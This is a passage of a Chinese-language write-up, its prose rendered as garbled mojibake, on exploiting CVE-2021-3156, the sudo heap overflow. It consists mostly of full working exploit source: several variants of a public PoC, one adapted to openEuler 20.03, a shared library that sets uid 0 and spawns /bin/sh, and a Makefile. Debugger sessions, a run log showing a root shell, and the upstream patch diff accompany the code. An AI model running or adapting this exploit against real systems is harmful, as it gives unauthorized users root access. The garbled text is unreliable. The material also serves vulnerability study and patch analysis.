å…³äºåŠ¨æ€é“¾æ¥åº“ç¼–è¯‘æœ‰æ— ç©ºæ ¼çš„é—®é¢˜ï¼Œå¦‚æœæ˜¯ç²¾å‡†è¦†å†™`name`ï¼Œé‚£ä¹ˆå°±ä¸éœ€è¦ç©ºæ ¼ï¼Œå› ä¸ºä¹‹åä¼šè¢«è¦†å†™ä¸º`0`ï¼Œå¦åˆ™å°±éœ€è¦ç©ºæ ¼ã€‚

[![](https://p5.ssl.qhimg.com/t01b9680e709fa50e15.png)](https://p5.ssl.qhimg.com/t01b9680e709fa50e15.png)



## EXP

```
/**
 ** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;
 ** ===========================================
 **
 ** Exploit for that sudo heap overflow thing everyone is talking about.
 ** This one aims for singleshot. Does not fuck with your system files.
 ** No warranties.
 **
 ** Shout outs to:
 **   Qualys      - for pumping out the awesome bugs
 **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)
 **   dsc         - for letting me rack up his electricity bill
 **   my wife     - for all the quality time we had to skip
 **
 **  Enjoy!
 **
 **   -- blasty // 20210130
 **/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;
#include &lt;unistd.h&gt;
#include &lt;ctype.h&gt;

// 512 environment variables should be enough for everyone
#define MAX_ENVP 0x1000

typedef struct `{`
        char *target_name;
        char *sudoedit_path;
        uint32_t smash_len_a;
        uint32_t smash_len_b;
        uint32_t null_stomp_len;
        uint32_t lc_all_len;
`}` target_t;

char *lc_names[]=`{`
        "LC_COLLATE",
        "LC_CTYPE",
        "LC_MONETARY",
        "LC_NUMERIC",
        "LC_TIME",
        "LC_MESSAGES",
        "LC_PAPER",
        "LC_NAME",
        "LC_ADDRESS",
        "LC_TELEPHONE",
        "LC_MEASUREMENT",
        "LC_IDENTIFICATION"
`}`;

target_t targets[] = `{`
    `{`
        // Yes, same values as 20.04.1, but also confirmed.
        .target_name    = "Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27",
        .sudoedit_path  = "/usr/bin/sudoedit",
        .smash_len_a    = 58,
        .smash_len_b    = 54,
        .null_stomp_len = 63,
        .lc_all_len     = 0x30
        // .lc_all_len     = 212
    `}`,
    `{`
        .target_name    = "Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31",
        .sudoedit_path  = "/usr/bin/sudoedit",
        .smash_len_a    = 58,
        .smash_len_b    = 54,
        .null_stomp_len = 63,
        .lc_all_len     = 212
    `}`,
    `{`
        .target_name    = "Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28",
        .sudoedit_path  = "/usr/bin/sudoedit",
        .smash_len_a    = 64,
        .smash_len_b    = 49,
        .null_stomp_len = 60,
        .lc_all_len     = 214
    `}`
`}`;

void usage(char *prog) `{`
    printf("  usage: %s &lt;target&gt;\n\n", prog);
    printf("  available targets:\n");
    printf("  ------------------------------------------------------------\n");
    for(int i = 0; i &lt; sizeof(targets) / sizeof(target_t); i++) `{`
        printf("    %d) %s\n", i, targets[i].target_name);
    `}`
    printf("  ------------------------------------------------------------\n");
    printf("\n");
`}`

int main(int argc, char *argv[]) `{`
    printf("\n** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;\n\n");

    if (argc != 2) `{`
        usage(argv[0]);
        return -1;
    `}`

    int target_idx = atoi(argv[1]);

    if (target_idx &lt; 0 || target_idx &gt;= (sizeof(targets) / sizeof(target_t))) `{`
        fprintf(stderr, "invalid target index\n");
        return -1;
    `}`

    target_t *target = &amp;targets[ target_idx ];

    printf("using target: '%s'\n", target-&gt;target_name);

    char *smash_a = calloc(target-&gt;smash_len_a + 2, 1);
    char *smash_b = calloc(target-&gt;smash_len_b + 2, 1);

    memset(smash_a, 'A', target-&gt;smash_len_a);
    memset(smash_b, 'B', target-&gt;smash_len_b);

    smash_a[target-&gt;smash_len_a] = '\\';
    smash_b[target-&gt;smash_len_b] = '\\';

    char *s_argv[]=`{`
        // "sudoedit", "-s", smash_a, "\\", NULL
        // "sudoedit", "-s", smash_a, NULL
        "sudoedit", "-s", smash_a, "\\", smash_b, NULL
    `}`;

    char *s_envp[MAX_ENVP];
    int envp_pos = 0;

    for(int i = 0; i &lt; (0x2b6); i++) `{`
        s_envp[envp_pos++] = "\\";
    `}`
    s_envp[envp_pos++] = "X/P0P_SH3LLZ_";

    int lc_len = 0x20;
    int lc_num = 2;

    int i = 0;
    char *temp=NULL;

    for(i = 11; i &gt; (11 - lc_num); i--)`{`
        temp = calloc(lc_len + strlen(lc_names[i]) + 10, 1);
        strcpy(temp, lc_names[i]);
        strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
        memset(temp+strlen(lc_names[i]) + 9, 'A'+i, lc_len);
        s_envp[envp_pos++] = temp;
    `}`
    temp = calloc(0x50 + strlen(lc_names[i]) + 10, 1);
    strcpy(temp, lc_names[i]);
    strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
    memset(temp+strlen(lc_names[i]) + 9, 'A'+i, 0x50);
    s_envp[envp_pos++] = temp;

    i -= 1;
    // temp = calloc(0x60 + strlen(lc_names[i]) + 10, 1);
    // strcpy(temp, lc_names[i]);
    // strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
    // memset(temp+strlen(lc_names[i]) + 9, 'A'+i, 0x60);
    // s_envp[envp_pos++] = temp;
    //
    // i -= 1;

    temp = calloc(lc_len + strlen(lc_names[i]) + 10, 1);
    strcpy(temp, lc_names[i]);
    strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
    memset(temp+strlen(lc_names[i]) + 9, 'A'+i, lc_len);
    s_envp[envp_pos++] = temp;
    i-=1;

    temp = calloc(lc_len + strlen(lc_names[i]) + 10, 1);
    strcpy(temp, lc_names[i]);
    strcpy(temp + strlen(lc_names[i]), "=XXXXXXXX");
    memset(temp+strlen(lc_names[i]) + 9, 'A'+i, lc_len);
    s_envp[envp_pos++] = temp;

    s_envp[envp_pos++] = NULL;

    printf("** pray for your rootshell.. **\n");

    execve(target-&gt;sudoedit_path, s_argv, s_envp);
    // execve(target-&gt;sudoedit_path, s_argv, NULL);
    return 0;
`}`
```

è¿™é‡Œçš„`exp`ä¸åŸå§‹çš„`exp`ä¸åŒï¼ŒåŸå§‹çš„`exp`æ˜¯ç”¨`LC_ALL`æ­¤æ—¶ä¼šåœ¨`sudo_conf_read`å‡½æ•°ä¸­è°ƒç”¨`setlocale(LC_ALL, "C"),setlocale(LC_ALL, prev_locale)`ä¼šç”³è¯·å’Œé‡Šæ”¾å¤§é‡çš„å †å—ï¼Œæ­¤æ—¶ä¹Ÿä¼šé‡Šæ”¾`_nl_global_locale.__names`ä¸­ä¿å­˜çš„å †å—åœ°å€å…¶å®å°±æ˜¯`newnames`ä¸­çš„å †å—åœ°å€ä¹Ÿå°±æ˜¯å­˜å‚¨æˆ‘ä»¬ç¯å¢ƒå˜é‡å€¼çš„å †å—ï¼Œé€šè¿‡é‡Šæ”¾å¤§é‡çš„`0xf0`å †å—è¿›å…¥`unsorted bin`ï¼Œç„¶åå†ç”³è¯·`0x20`çš„æ—¶å€™ï¼Œåˆ¶é€ ä¸€ä¸ª`0xd0`å¤§å°çš„`small bin`ã€‚æ­¤æ—¶è¿˜ä¼šæœ‰ä¸€ä¸ª`unsorted bin`ï¼Œç”±äºåœ¨`get_user_info`ä¼šç”³è¯·ä¸€ä¸ª`0x80,0x1000`çš„å †å—ï¼Œæ­¤æ—¶`small bin,unsorted bin`ä¼šäº’æ¢ä½ç½®ï¼Œä¹Ÿå°±æ˜¯`0x80`å¤§å°çš„å †å—å’Œ`group files service_user`ä¼šåœ¨`unsorted bin`ç›¸é‚»çš„ä½ç½®ç”³è¯·ï¼Œéå¸¸çš„å·§å¦™ã€‚

åˆå§‹çš„`exp`ï¼Œ`lib`ï¼Œ`Makefile`å¦‚ä¸‹

```
//hax.c
/**
 ** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;
 ** ===========================================
 **
 ** Exploit for that sudo heap overflow thing everyone is talking about.
 ** This one aims for singleshot. Does not fuck with your system files.
 ** No warranties.
 **
 ** Shout outs to:
 **   Qualys      - for pumping out the awesome bugs
 **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)
 **   dsc         - for letting me rack up his electricity bill
 **   my wife     - for all the quality time we had to skip
 **
 **  Enjoy!
 **
 **   -- blasty // 20210130
 **/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;
#include &lt;unistd.h&gt;
#include &lt;ctype.h&gt;

// 512 environment variables should be enough for everyone
#define MAX_ENVP 512

typedef struct `{`
    char *target_name;
    char *sudoedit_path;
    uint32_t smash_len_a;
    uint32_t smash_len_b;
    uint32_t null_stomp_len;
    uint32_t lc_all_len; 
`}` target_t;

target_t targets[] = `{`
    `{`
        // Yes, same values as 20.04.1, but also confirmed.
        .target_name    = "Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27",
        .sudoedit_path  = "/usr/bin/sudoedit",
        .smash_len_a    = 56,
        .smash_len_b    = 54,
        .null_stomp_len = 63, 
        .lc_all_len     = 212
    `}`,
    `{`
        .target_name    = "Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31",
        .sudoedit_path  = "/usr/bin/sudoedit",
        .smash_len_a    = 56,
        .smash_len_b    = 54,
        .null_stomp_len = 63, 
        .lc_all_len     = 212
    `}`,
    `{`
        .target_name    = "Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28",
        .sudoedit_path  = "/usr/bin/sudoedit",
        .smash_len_a    = 64,
        .smash_len_b    = 49,
        .null_stomp_len = 60, 
        .lc_all_len     = 214
    `}`
`}`;

void usage(char *prog) `{`
    printf("  usage: %s &lt;target&gt;\n\n", prog);
    printf("  available targets:\n");
    printf("  ------------------------------------------------------------\n");
    for(int i = 0; i &lt; sizeof(targets) / sizeof(target_t); i++) `{`
        printf("    %d) %s\n", i, targets[i].target_name);
    `}`
    printf("  ------------------------------------------------------------\n");
    printf("\n");
`}`

int main(int argc, char *argv[]) `{`
    printf("\n** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;\n\n");

    if (argc != 2) `{`
        usage(argv[0]);
        return -1;
    `}`

    int target_idx = atoi(argv[1]);

    if (target_idx &lt; 0 || target_idx &gt;= (sizeof(targets) / sizeof(target_t))) `{`
        fprintf(stderr, "invalid target index\n");
        return -1;
    `}`

    target_t *target = &amp;targets[ target_idx ];

    printf("using target: '%s'\n", target-&gt;target_name);

    char *smash_a = calloc(target-&gt;smash_len_a + 2, 1);
    char *smash_b = calloc(target-&gt;smash_len_b + 2, 1);

    memset(smash_a, 'A', target-&gt;smash_len_a);
    memset(smash_b, 'B', target-&gt;smash_len_b);

    smash_a[target-&gt;smash_len_a] = '\\';
    smash_b[target-&gt;smash_len_b] = '\\';

    char *s_argv[]=`{`
        "sudoedit", "-s", smash_a, "\\", smash_b, NULL
    `}`;

    char *s_envp[MAX_ENVP];
    int envp_pos = 0;

    for(int i = 0; i &lt; target-&gt;null_stomp_len; i++) `{`
        s_envp[envp_pos++] = "\\";
    `}`
    s_envp[envp_pos++] = "X/P0P_SH3LLZ_";

    char *lc_all = calloc(target-&gt;lc_all_len + 16, 1);
    strcpy(lc_all, "LC_ALL=C.UTF-8@");
    memset(lc_all+15, 'C', target-&gt;lc_all_len);

    s_envp[envp_pos++] = lc_all;
    s_envp[envp_pos++] = NULL;

    printf("** pray for your rootshell.. **\n");

    execve(target-&gt;sudoedit_path, s_argv, s_envp);
    return 0;
`}`
```

```
//lib.c
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

static void __attribute__ ((constructor)) _init(void);

static void _init(void) `{`
    printf("[+] bl1ng bl1ng! We got it!\n");
    setuid(0); seteuid(0); setgid(0); setegid(0);
    static char *a_argv[] = `{` "sh", NULL `}`;
    static char *a_envp[] = `{` "PATH=/bin:/usr/bin:/sbin", NULL `}`;
    execv("/bin/sh", a_argv);
`}`
```

```
all:
    rm -rf libnss_X
    mkdir libnss_X
    gcc -o sudo-hax-me-a-sandwich hax.c
    gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_.so.2' lib.c
clean:
    rm -rf libnss_X sudo-hax-me-a-sandwich
```



## For open euler 20.03

ç³»ç»Ÿç±»ä¼¼äº`centos`ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹`/etc/nsswitch.conf`å³é…ç½®æ–‡ä»¶

```
passwd:      sss files systemd
shadow:     files sss
group:       sss files systemd

hosts:      files dns myhostname

bootparams: files

ethers:     files
netmasks:   files
networks:   files
protocols:  files
rpc:        files
services:   files sss

netgroup:   sss

publickey:  files

automount:  files sss
aliases:    files
```

å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„é¡ºåºå’ŒæœåŠ¡è§„èŒƒå’Œ`ubuntu`ä¸‹é¢ä¸ä¸€æ ·ï¼Œå› æ­¤è¿™é‡Œçš„å †å¸ƒå±€ä¸`ubuntu`ä¹Ÿä¸ç›¸åŒã€‚æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ç³»ç»Ÿçš„è°ƒç”¨é€»è¾‘æ˜¯å¦å‘ç”Ÿäº†æ”¹å˜ã€‚ç»è¿‡è°ƒè¯•å‘ç°å…¶è°ƒç”¨é€»è¾‘ä¸`ubuntu`ä¸‹ç›¸åŒ

æˆ‘ä»¬å°†`ni`ç»“æ„ä½“æ‰‹åŠ¨ä¿®æ”¹å¦‚ä¸‹

```
pwndbg&gt; p *ni
$4 = `{`
  next = 0x0,
  actions = `{`NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE`}`,
  library = 0x555555582be0,
  known = 0x555555592b30,
  name = 0x5555555861a0 "X/P0P_SH3LLZ_ "
`}`
pwndbg&gt; p shlib_name
$5 = 0x7fffffffdeb0 "libnss_X/P0P_SH3LLZ_ .so.2"
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0101be57f2464a08e7.png)

ç»è¿‡æ‰‹åŠ¨ä¿®æ”¹çš„`ni`ç»“æ„ä½“ï¼Œè¿™é‡Œç»§ç»­æ‰§è¡Œå°±ä¼š`getshell`ã€‚

```
pwndbg&gt; c
Continuing.
[+] bl1ng bl1ng! We got it!
process 123212 is executing new program: /usr/bin/bash
Error in re-setting breakpoint 2: No source file named sudo.c.
Error in re-setting breakpoint 3: No source file named sudo.c.
Error in re-setting breakpoint 4: No source file named sudo.c.
```

é‚£ä¹ˆæ¥ä¸‹æ¥çš„é—®é¢˜å°±æ˜¯å¦‚ä½•å¤ä¹ è¿™ä¸ªç»“æ„ä½“äº†ï¼Œä¸`ubuntu`è¦†å†™`files service_user`ä¸åŒï¼Œè¿™é‡Œéœ€è¦è¦†å†™çš„æ˜¯`sss service_user`ç»“æ„ä½“ï¼Œä½†æ˜¯ä¸¤è€…æ²¡æœ‰æœ¬è´¨çš„åŒºåˆ«éƒ½æ˜¯`group`çš„ç¬¬ä¸€ä¸ªç»“æ„ä½“ï¼Œå”¯ä¸€ä¸åŒçš„å°±æ˜¯åˆ†é…åˆ°`group`æœåŠ¡è§„èŒƒçš„ç»“æ„ä½“ä¹‹å‰`get_user_info`æ‰€åˆ†é…çš„å †å—çš„æ•°é‡ï¼Œæˆ‘ä»¬è°ƒè¯•ä¸€ä¸‹

```
malloc(0x100)
malloc(0x400)
malloc(0x228) // tcache
malloc(0x10)
malloc(0x78)// ç›®æ ‡0x80å †å—
malloc(0x1000)
malloc(0x17) // å¼€å§‹ä¸ºpasswdåˆ†é…service_user // tcache
malloc(0x34)
malloc(0x36)
malloc(0x38)
malloc(0x17) // å¼€å§‹ä¸ºshadowåˆ†é…service_user
malloc(0x36)
malloc(0x34)
malloc(0x16)// å¼€å§‹ä¸ºgroupåˆ†é…service_user
malloc(0x34)// è¿™é‡Œå°±æ˜¯sss service_userçš„ç»“æ„ä½“
```

è¿™é‡Œæˆ‘ä»¬éœ€è¦æå‰å¸ƒç½®`6`ä¸ª`0x40`å¤§å°çš„å †å—ï¼Œå’Œä¸€ä¸ª`0xc0`å¤§å°çš„å †å—ï¼ˆè¿™é‡Œå¸ƒç½®`0x80`çš„å †å—ä¸åˆé€‚ï¼Œå› ä¸ºä¹‹åä¼šè¢«ç”³è¯·å¹¶æ›´æ¢ä¸ºé«˜åœ°å€çš„`0x80`å †å—ï¼Œç»è¿‡æµ‹è¯•`0xc0`å¤§å°çš„å †å—å¯ä»¥ã€‚ï¼‰

### <a class="reference-link" name="EXP"></a>EXP

```
/**
 ** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;
 ** ===========================================
 **
 ** Exploit for that sudo heap overflow thing everyone is talking about.
 ** This one aims for singleshot. Does not fuck with your system files.
 ** No warranties.
 **
 ** Shout outs to:
 **   Qualys      - for pumping out the awesome bugs
 **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)
 **   dsc         - for letting me rack up his electricity bill
 **   my wife     - for all the quality time we had to skip
 **
 **  Enjoy!
 **
 **   -- blasty // 20210130
 **/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;
#include &lt;unistd.h&gt;
#include &lt;ctype.h&gt;

// 512 environment variables should be enough for everyone
#define MAX_ENVP 0x1000

typedef struct `{`
    char *target_name;
    char *sudoedit_path;
    uint32_t smash_len_a;
    uint32_t smash_len_b;
    uint32_t null_stomp_len;
    uint32_t lc_all_len;
`}` target_t;

char *lc_names[]=`{`
        "LC_COLLATE",
        "LC_CTYPE",
        "LC_MONETARY",
        "LC_NUMERIC",
        "LC_TIME",
        "LC_MESSAGES",
        "LC_PAPER",
        "LC_NAME",
        "LC_ADDRESS",
        "LC_TELEPHONE",
        "LC_MEASUREMENT",
        "LC_IDENTIFICATION"
`}`;

target_t targets[] = `{`
    `{`
        // Yes, same values as 20.04.1, but also confirmed.
        .target_name    = "Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27",
        .sudoedit_path  = "/usr/bin/sudoedit",
        .smash_len_a    = 0x53,
        .smash_len_b    = 0x54,
        .null_stomp_len = 63,
        .lc_all_len     = 0x30
        // .lc_all_len     = 212
    `}`,
    `{`
        .target_name    = "Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31",
        .sudoedit_path  = "/usr/local/bin/sudoedit",
        .smash_len_a    = 56,
        .smash_len_b    = 54,
        .null_stomp_len = 63,
        .lc_all_len     = 212
    `}`,
    `{`
        .target_name    = "Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28",
        .sudoedit_path  = "/usr/bin/sudoedit",
        .smash_len_a    = 64,
        .smash_len_b    = 49,
        .null_stomp_len = 60,
        .lc_all_len     = 214
    `}`,
    `{`
        // Yes, same values as 20.04.1, but also confirmed.
        .target_name    = "openEuler release 20.03 (LTS) - sudo 1.8.27, libc-2.28",
        .sudoedit_path  = "/usr/bin/sudoedit",
        .smash_len_a    = 0x53,
        .smash_len_b    = 0x54,
        .null_stomp_len = 0x185,
        .lc_all_len     = 0xa0
        // .lc_all_len     = 212
    `}`,
`}`;

void usage(char *prog) `{`
    printf("  usage: %s &lt;target&gt;\n\n", prog);
    printf("  available targets:\n");
    printf("  ------------------------------------------------------------\n");
    for(int i = 0; i &lt; sizeof(targets) / sizeof(target_t); i++) `{`
        printf("    %d) %s\n", i, targets[i].target_name);
    `}`
    printf("  ------------------------------------------------------------\n");
    printf("\n");
`}`

int main(int argc, char *argv[]) `{`
    printf("\n** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;\n\n");

    if (argc != 2) `{`
        usage(argv[0]);
        return -1;
    `}`

    int target_idx = atoi(argv[1]);

    if (target_idx &lt; 0 || target_idx &gt;= (sizeof(targets) / sizeof(target_t))) `{`
        fprintf(stderr, "invalid target index\n");
        return -1;
    `}`

    target_t *target = &amp;targets[ target_idx ];

    printf("using target: '%s'\n", target-&gt;target_name);

    char *smash_a = calloc(target-&gt;smash_len_a + 2, 1);
    char *smash_b = calloc(target-&gt;smash_len_b + 2, 1);

    memset(smash_a, 'A', target-&gt;smash_len_a);
    memset(smash_b, 'B', target-&gt;smash_len_b);

    smash_a[target-&gt;smash_len_a] = '\\';
    smash_b[target-&gt;smash_len_b] = '\\';

    char *s_argv[]=`{`
        // "sudoedit", "-s", smash_a, "\\", NULL
        // "sudoedit", "-s", smash_a, NULL
        "sudoedit", "-s", smash_a, "\\", smash_b, NULL
    `}`;

    char *s_envp[MAX_ENVP];
    int envp_pos = 0;

    for(int i = 0; i &lt; target-&gt;null_stomp_len; i++) `{`
        s_envp[envp_pos++] = "\\";
    `}`
    s_envp[envp_pos++] = "X/P0P_SH3LLZ_";

    int lc_len = 0x20;
    int lc_num = 0x5;

    int i = 0;
    char *temp=NULL;

    for(i = 11; i &gt; (11 - lc_num); i--)`{`
        temp = calloc(lc_len + strlen(lc_names[i]) + 10, 1);
        strcpy(temp, lc_names[i]);
        strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
        memset(temp+strlen(lc_names[i]) + 9, 'A'+i, lc_len);
        s_envp[envp_pos++] = temp;
    `}`
    temp = calloc(target-&gt;lc_all_len + strlen(lc_names[i]) + 10, 1);
    strcpy(temp, lc_names[i]);
    strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
    memset(temp+strlen(lc_names[i]) + 9, 'A'+i, target-&gt;lc_all_len);
    s_envp[envp_pos++] = temp;

    i -= 1;
    // temp = calloc(0x60 + strlen(lc_names[i]) + 10, 1);
    // strcpy(temp, lc_names[i]);
    // strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
    // memset(temp+strlen(lc_names[i]) + 9, 'A'+i, 0x60);
    // s_envp[envp_pos++] = temp;
    //
    // i -= 1;

    temp = calloc(lc_len + strlen(lc_names[i]) + 10, 1);
    strcpy(temp, lc_names[i]);
    strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
    memset(temp+strlen(lc_names[i]) + 9, 'A'+i, lc_len);
    s_envp[envp_pos++] = temp;
    i-=1;

    if (target_idx == 3)`{`
        temp = calloc(0xd0 + strlen(lc_names[i]) + 10, 1);
        strcpy(temp, lc_names[i]);
        strcpy(temp + strlen(lc_names[i]), "=C.UTF-8@");
        memset(temp+strlen(lc_names[i]) + 9, 'A'+i, 0xd0);
        s_envp[envp_pos++] = temp;

        i -= 1;
    `}`


    temp = calloc(lc_len + strlen(lc_names[i]) + 10, 1);
    strcpy(temp, lc_names[i]);
    strcpy(temp + strlen(lc_names[i]), "=XXXXXXXX");
    memset(temp+strlen(lc_names[i]) + 9, 'A'+i, lc_len);
    s_envp[envp_pos++] = temp;

    s_envp[envp_pos++] = NULL;

    printf("** pray for your rootshell.. **\n");

    execve(target-&gt;sudoedit_path, s_argv, s_envp);
    // execve(target-&gt;sudoedit_path, s_argv, NULL);
    return 0;
`}`
```

```
[normal@172 CVE-2021-3156_blasty]$ ./sudo-hax-me-a-sandwich 3

** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;

using target: 'openEuler release 20.03 (LTS) - sudo 1.8.27, libc-2.28'
** pray for your rootshell.. **
[+] bl1ng bl1ng! We got it!
sh-5.0# exit
exit
```



## Patch

[patch 049ad90590be](https://www.sudo.ws/repos/sudo/rev/049ad90590be)

```
--- a/plugins/sudoers/sudoers.c    Sat Jan 23 08:43:59 2021 -0700
+++ b/plugins/sudoers/sudoers.c    Sat Jan 23 08:43:59 2021 -0700
@@ -547,7 +547,7 @@

     /* If run as root with SUDO_USER set, set sudo_user.pw to that user. */
     /* XXX - causes confusion when root is not listed in sudoers */
-    if (sudo_mode &amp; (MODE_RUN | MODE_EDIT) &amp;&amp; prev_user != NULL) `{`
+    if (ISSET(sudo_mode, MODE_RUN|MODE_EDIT) &amp;&amp; prev_user != NULL) `{`
     if (user_uid == 0 &amp;&amp; strcmp(prev_user, "root") != 0) `{`
         struct passwd *pw;

@@ -932,8 +932,8 @@
     if (user_cmnd == NULL)
     user_cmnd = NewArgv[0];

-    if (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) `{`
-    if (ISSET(sudo_mode, MODE_RUN | MODE_CHECK)) `{`
+    if (ISSET(sudo_mode, MODE_RUN|MODE_EDIT|MODE_CHECK)) `{`
+    if (!ISSET(sudo_mode, MODE_EDIT)) `{`
         const char *runchroot = user_runchroot;
         if (runchroot == NULL &amp;&amp; def_runchroot != NULL &amp;&amp;
             strcmp(def_runchroot, "*") != 0)
@@ -961,7 +961,8 @@
         sudo_warnx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
         debug_return_int(NOT_FOUND_ERROR);
         `}`
-        if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) `{`
+        if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL) &amp;&amp;
+            ISSET(sudo_mode, MODE_RUN)) `{`
         /*
          * When running a command via a shell, the sudo front-end
          * escapes potential meta chars.  We unescape non-spaces
@@ -969,10 +970,22 @@
          */
         for (to = user_args, av = NewArgv + 1; (from = *av); av++) `{`
             while (*from) `{`
-            if (from[0] == '\\' &amp;&amp; !isspace((unsigned char)from[1]))
+            if (from[0] == '\\' &amp;&amp; from[1] != '\0' &amp;&amp;
+                !isspace((unsigned char)from[1])) `{`
                 from++;
+            `}`
+            if (size - (to - user_args) &lt; 1) `{`
+                sudo_warnx(U_("internal error, %s overflow"),
+                __func__);
+                debug_return_int(NOT_FOUND_ERROR);
+            `}`
             *to++ = *from++;
             `}`
+            if (size - (to - user_args) &lt; 1) `{`
+            sudo_warnx(U_("internal error, %s overflow"),
+                __func__);
+            debug_return_int(NOT_FOUND_ERROR);
+            `}`
             *to++ = ' ';
         `}`
         *--to = '\0';
```

`patch`æ£€æŸ¥äº†å‚æ•°æ˜¯å¦ä»¥åæ–œæ ç»“å°¾ï¼Œå¹¶åœ¨æ‹·è´è¿‡ç¨‹ä¸­å¯¹æº¢å‡ºè¿›è¡Œäº†æ£€æµ‹ã€‚

## è¡¥å……

é’ˆå¯¹åˆ©ç”¨`1`ï¼Œæˆ‘è¿™é‡Œæ²¡æœ‰è°ƒè¯•å‡ºæ¥ï¼Œæœ‰å¤§ä½¬çŸ¥é“æ˜¯å’‹å›äº‹å˜›ï¼Œ23333

æˆ‘è°ƒè¯•è¿‡ç¨‹ä¸­å‘ç°æ²¡æœ‰è¿›å…¥`process_hooks_getenv`çš„è·¯å¾„ï¼Œçœ‹æºç åˆ†æï¼Œ`github`ä¸­çš„`exp`æ‰§è¡Œçš„æ˜¯`SUDO_EDITOR`ï¼Œä»æºç ä¸­æ¥çœ‹åº”è¯¥æ˜¯ä½äº`find_editor`å‡½æ•°ä¸­

```
char *
find_editor(int nfiles, char **files, int *argc_out, char ***argv_out,
     char * const *whitelist, const char **env_editor, bool env_error)
`{`
    char *ev[3], *editor_path = NULL;
    unsigned int i;
    debug_decl(find_editor, SUDOERS_DEBUG_UTIL)

    /*
     * If any of SUDO_EDITOR, VISUAL or EDITOR are set, choose the first one.
     */
    *env_editor = NULL;
    ev[0] = "SUDO_EDITOR";
    ev[1] = "VISUAL";
    ev[2] = "EDITOR";
    for (i = 0; i &lt; nitems(ev); i++) `{`
    char *editor = getenv(ev[i]);
      //...
    `}`
```

è€Œè¯¥å‡½æ•°åœ¨ç”³è¯·å®Œ`user_args`å †å—ä¹‹åçš„è°ƒç”¨å‘ç°

```
/* Require a password if sudoers says so.  */
switch (check_user(validated, sudo_mode)) `{`
  case true:
    /* user authenticated successfully. */
    break;
  case false:
    /* Note: log_denial() calls audit for us. */
    if (!ISSET(validated, VALIDATE_SUCCESS)) `{`
      /* Only display a denial message if no password was read. */
      if (!log_denial(validated, def_passwd_tries &lt;= 0))
        goto done;
    `}`
    goto bad;
  default:
    /* some other error, ret is -1. */
    goto done;
`}`
//...
free(safe_cmnd);
safe_cmnd = find_editor(NewArgc - 1, NewArgv + 1, &amp;edit_argc,
                        &amp;edit_argv, NULL, &amp;env_editor, false);
```

ä½†æ˜¯è¯¥å‡½æ•°çš„è°ƒç”¨æ˜¯ä½äº`check_user`å‡½æ•°ä¹‹åçš„ï¼Œè¯¥å‡½æ•°ç»è¿‡è°ƒè¯•å‘ç°éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼Œä¸€ä¸ªæ˜¯å¯†ç è¾“å…¥æ­£ç¡®ï¼Œå¦ä¸€ä¸ªå°±æ˜¯ç”¨æˆ·éœ€è¦åœ¨`sudo`åˆ—è¡¨ä¸­ï¼Œä½†æ˜¯æ»¡è¶³è¿™ä¸ªæ¡ä»¶çš„è¯å°±ä¸è¦ææƒäº†ã€‚

å¦å¤–è¿˜æœ‰è°ƒç”¨å°±æ˜¯`visudo`å’Œ`plugin/sample`äº†ã€‚

